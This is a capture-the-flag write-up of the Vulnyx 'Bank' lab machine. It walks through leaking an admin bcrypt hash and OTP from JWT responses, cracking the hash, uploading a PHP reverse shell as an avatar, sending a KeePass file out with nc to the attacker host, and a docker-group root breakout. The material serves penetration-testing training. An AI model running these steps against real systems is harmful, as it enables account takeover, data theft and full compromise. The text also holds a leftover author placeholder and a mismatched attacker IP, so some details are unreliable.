# Vulnyx: Bank

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | Alherrero |
| **Tools used** | `nmap` · `smbmap` · `smbclient` · `john` · `BurpSuite` · `nc` · `keepassxc` · `docker` |
| **URL** | `https://vulnyx.com/machines/` |

An SMB share leaks the path to a hidden development instance of a banking web app. A money-transfer feature meant to verify a recipient's username instead returns their full user object — including a bcrypt password hash — inside a JWT, and a failed OTP attempt does the same with the real one-time code. Those two leaks are enough to log in as `admin` and abuse a profile avatar upload to get a PHP web shell. From there, a KeePass database recovered from the filesystem yields SSH credentials for `marcelo`, and membership in the `docker` group provides a straightforward path to root.

## Enumeration

A full TCP port scan is run first:

```bash
sudo nmap -p- -sS --open -n -vvv -Pn bank.nyx

PORT    STATE SERVICE      REASON
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 08:00:27:C2:B4:77 (Oracle VirtualBox virtual NIC)
```

A version/script scan against the open ports fills in the details:

```bash
sudo nmap -p 80,139,445 -sCV bank.nyx

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.66
|_http-title: Bank Alpha | Welcome
|_http-server-header: Apache/2.4.66 (Debian)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:C2:B4:77 (Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BANK, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-07-22T10:23:36
|_  start_date: N/A
```

**80/tcp** is a web server, and **139/445** point to SMB — worth enumerating on its own before touching the web app.

### Web Enumeration

The main page:

```
http://bank.nyx/
```
<img src="Images/bank/Pasted image 20260522165318.png"/>

#### SMB

A quick look at what's shared over SMB:

```bash
smbmap -H bank.nyx                         

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.0.2.51:445   Name: bank.nyx                  Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        development                                             READ ONLY
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.22.8-Debian-4.22.8+dfsg-0+deb13u1)
        nobody                                                  NO ACCESS       Home Directories
[*] Closed 1 connections 
```

A `development` share stands out. It's accessible without credentials:

```bash
smbclient -N //bank.nyx/development
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun May  3 06:43:20 2026
  ..                                  D        0  Sun May  3 06:43:20 2026
  03-may-26.txt                       N     1141  Sun May  3 06:43:20 2026

                9627844 blocks of size 1024. 6282348 blocks available
smb: \> get 03-may-26.txt 
getting file \03-may-26.txt of size 1141 as 03-may-26.txt (159.2 KiloBytes/sec) (average 159.2 KiloBytes/sec)
```

```bash
cat 03-may-26.txt 
Subject: AI Agent Integration & Development Environment Setup

To streamline and accelerate the development of the banking platform, we have decided to integrate a subscription-based AI agent into our workflow. 
The service has proven to be cost-effective; however, please be aware that the AI may occasionally produce incorrect or unexpected outputs. 
For this reason, it is important to maintain strict attention to security and validate all critical operations.

A dedicated development directory has been enabled where developers can access and test the application.
Dir: development-0119-d5e051a-9da2-12sdas1-775-e0174

Additionally, the system administrator user called Juan, hired by Lucas in recent days, is currently on a probationary training period within the company. 
He will be responsible for completing the configuration of the SMB service. While the service is already installed, some final setup steps are 
still pending. Please note that he is still gaining experience, so we kindly ask for patience and encourage collaboration and assistance if needed 
to ensure everything is properly configured.

Best regards,
Marcelo
```

The file leaks the path to a non-public instance of the application:

> **Endpoint:** `development-0119-d5e051a-9da2-12sdas1-775-e0174`

#### The Hidden Application

```
http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/
```

<img src="Images/bank/Pasted image 20260522165439.png"/>


A new account is registered — `hacker` — to get an authenticated session and access the rest of the app's functionality. *(Fill in here how the registration was done: form fields used, whether it was a simple signup form, etc.)*

The app looks like a simple banking dashboard, with functionality to register accounts and send money between users:

```
http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=dashboard
```

<img src="Images/bank/Pasted image 20260522165459.png"/>

An `admin` account is visible from the dashboard.

## Account Takeover

### Leaking the Admin Hash

The money-transfer form includes a `verify_recipient` field, presumably meant to check that a username exists before a transfer goes through. The request sending an empty transfer with `to_username=admin` is captured:

```http
POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=dashboard HTTP/1.1
Host: bank.nyx
Cookie: PHPSESSID=f0de0153646d6ddf259f4e8007230aaa; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMCwidXNlcm5hbWUiOiJoYWNrZXIiLCJpc19hZG1pbiI6MCwiZXhwIjoxNzc5MjI2Nzg4LCJvdHBfdmVyaWZpZWQiOnRydWV9.fIadTnUzdbYYYc87DF5xsjkJKQPn8j-CktKnvi3qz7c
Content-Type: application/x-www-form-urlencoded

to_username=admin&verify_recipient=&amount=&description=
```

<img src="Images/bank/Pasted image 20260522165552.png"/>

The response includes a new JWT. Decoded, its payload is:

```json
{
  "id": 1,
  "username": "admin",
  "password": "$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi",
  "balance": "999999.99",
  "is_admin": 1,
  "use_otp": 1,
  "created_at": "2026-05-02 13:24:13"
}
```
<img src="Images/bank/Pasted image 20260522165631.png"/>

Instead of returning a simple "recipient exists" flag, the endpoint embeds the recipient's entire database row — password hash included — inside the token. This is an IDOR-flavored information disclosure: the check itself is legitimate, but the data returned to satisfy it goes far beyond what the feature needs.

> **Password hash:** `$2y$12$X4uppQvzwFCSbVfCH7qF1eNOSA6/cBy/o5sbVcxxdfu/GF7.a0YKi`

### Cracking the Hash

The hash is bcrypt, identifiable by the `$2y$` prefix, and gets run against `rockyou.txt`:

```bash
john password_admin.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (?)     
1g 0:00:00:10 DONE (2026-07-22 06:36) 0.09487g/s 17.07p/s 17.07c/s 17.07C/s peanut..kisses
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> **Admin password:** `blink182`

### Bypassing the OTP

<img src="Images/bank/Pasted image 20260522163949.png"/>

Logging in with `admin:blink182` triggers a second factor — an OTP is required before the session is fully authenticated. Submitting an intentionally wrong code is enough to see how the server handles the check:

```http
POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php HTTP/1.1
Host: bank.nyx
Cookie: PHPSESSID=d1718b431f12af871e5115bf2a2ed792; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImV4cCI6MTc3OTIyNzQ0OSwib3RwIjozODk0MTcsImF0dGVtcHRzIjozLCJvdHBfdmVyaWZpZWQiOmZhbHNlfQ.11y06bwfz5ErFH7VEq89-Mea8loDRxl0bru5DXUc3hc
Content-Type: application/x-www-form-urlencoded

otp=1234&verify_otp=
```

<img src="Images/bank/Pasted image 20260522165751.png"/>

The response JWT decodes to:

```json
{
  "user_id": 1,
  "username": "admin",
  "is_admin": 1,
  "exp": 1779227449,
  "otp": 389417,
  "attempts": 2,
  "otp_verified": false
}
```
<img src="Images/bank/Pasted image 20260522165836.png"/>

The real OTP is sitting in plaintext inside the token issued after the failed attempt — no need to guess or brute-force it.

> **OTP:** `389417`

Submitting that code completes the login:

```
http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/admin.php
```
<img src="Images/bank/Pasted image 20260522164129.png"/>

## Initial Access

### Avatar Upload → RCE

The profile page allows uploading an avatar image:

```
http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=profile
```
<img src="Images/bank/Pasted image 20260522164143.png"/>

A PHP reverse shell is uploaded directly with a `.php` extension, without touching the content type. The endpoint doesn't validate the file extension at all:

```http
POST /development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=profile HTTP/1.1
Host: bank.nyx
Cookie: PHPSESSID=d1718b431f12af871e5115bf2a2ed792; auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImV4cCI6MTc3OTIyNzQ0OSwib3RwIjozODk0MTcsImF0dGVtcHRzIjoyLCJvdHBfdmVyaWZpZWQiOnRydWV9.8b_ksNIk46egtEmrnKt_Wo5oUMFi-prrXO3YbPEKL00
Content-Type: multipart/form-data; boundary=----geckoformboundary4e6b058c6063dc9919065a3203b5dfe3

------geckoformboundary4e6b058c6063dc9919065a3203b5dfe3
Content-Disposition: form-data; name="avatar"; filename="rev_shell.php"
Content-Type: image/png

<?php
// php-reverse-shell payload
```
<img src="Images/bank/Pasted image 20260522170058.png"/>

The upload lands in a predictable directory:

```
http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/
```
<img src="Images/bank/Pasted image 20260522164258.png"/>

A listener is set up, and the uploaded file is requested to trigger the callback:

```bash
nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.8] 34200
Linux bank 6.12.85+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.85-1 (2026-04-30) x86_64 GNU/Linux
 17:01:34 up 34 min,  0 users,  load average: 0.00, 0.04, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (746): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

## Loot: A KeePass Database

A look around the filesystem turns up a password note:

```bash
www-data@bank:/$ ls -l /srv/smb/
total 8
drwxrwxrwx 2 root root 4096 May  3 06:53 passwords
drwxrwxrwx 2 root root 4096 May  3 06:43 share
www-data@bank:/$ ls -l /srv/smb/passwords/
total 8
-rw-rw-r-- 1 juan juan  383 May  3 06:53 note.txt
-rw-rw-r-- 1 juan juan 2277 May  3 06:51 passwords.kdbx
www-data@bank:/$ cat /srv/smb/passwords/note.txt
Hey, as you said Marcelo, I've already left a KeePass file with all the system passwords you asked me to create, except for the root password.
The KeePass password is: `@zm{2h8aUu'a_M;'Jd:!MAQ?zn

Delete it after reading, but don't worry—I think I've configured this directory properly so only you can access
it, and it's not exposed on the SMB service either.

— Juan
www-data@bank:/$ cd /srv/smb/passwords/
```

> **Password:** `@zm{2h8aUu'a_M;'Jd:!MAQ?zn`

Along with (or near) that note, a KeePass database file (`passwords.kdbx`) is found on the box and exfiltrated over a raw `nc` transfer — one side listens and redirects the incoming stream to a file, the other sends the file into a connection to that listener:

```bash
# on the attacker box
nc -lvp 9002 > passwords.kdbx

# on the target
nc 10.0.2.8 9002 < passwords.kdbx
```

With the database local, `keepassxc` opens it using the password recovered from `note.txt` as the master password:

```bash
keepassxc
```
<img src="Images/bank/Pasted image 20260522164856.png"/>

The vault holds a set of SSH credentials:

> **Credentials:** `marcelo:m4rC1!#asl2#vsHj4!`

## Shell as marcelo

```bash
www-data@bank:/$ su marcelo
Password:
marcelo@bank:/$ id
uid=1000(marcelo) gid=1000(marcelo) groups=1000(marcelo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),105(docker)
marcelo@bank:/$ ls -l /home/marcelo/
total 4
-rw-rw-r-- 1 marcelo marcelo 33 May  3 07:02 user.txt
marcelo@bank:/$ cat /home/marcelo/user.txt
52728f2b72b6a153a415d8b738450fa3
marcelo@bank:/$
```

> **User flag:** `52728f2b72b6a153a415d8b738450fa3`

## Privilege Escalation

### Docker Group Abuse

```bash
marcelo@bank:/$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
```

`marcelo` has access to the Docker daemon — visible above in the `id` output (`105(docker)`). That alone is equivalent to root on the host: a container started from an image like `alpine` runs as root inside its own namespace by default, and mounting the host's root filesystem into the container makes it directly writable from a root-owned process. `chroot`-ing into that mount then treats the host filesystem as the container's own root:

```bash
marcelo@bank:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
6a0ac1617861: Pull complete
Digest: sha256:5b10f432ef3da1b8d4c7eb6c487f2f5a8f096bc91145e68878dd4a5019afde11
Status: Downloaded newer image for alpine:latest
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# ls -l /root
total 4
-rw-rw-r-- 1 root root 33 May  3 07:25 root.txt
# cat /root/root.txt
e8bd8213ff4f6b805dec9068fd35db44
```

> **Root flag:** `e8bd8213ff4f6b805dec9068fd35db44`

## Takeaways

- Endpoints meant to answer yes/no questions (does this recipient exist? is this OTP correct?) should never return more data than the question requires — both leaks on this box come from a "verification" response carrying the full underlying record instead of a boolean.
- A JWT is signed, not encrypted — anything inside its payload is plainly readable by decoding the token, not by breaking the signature. Sensitive data (a password hash, a real OTP) has no business sitting in a claim.
- Membership in the `docker` group is functionally equivalent to root access on the host, since it allows starting a root-owned container with the entire host filesystem bind-mounted in.
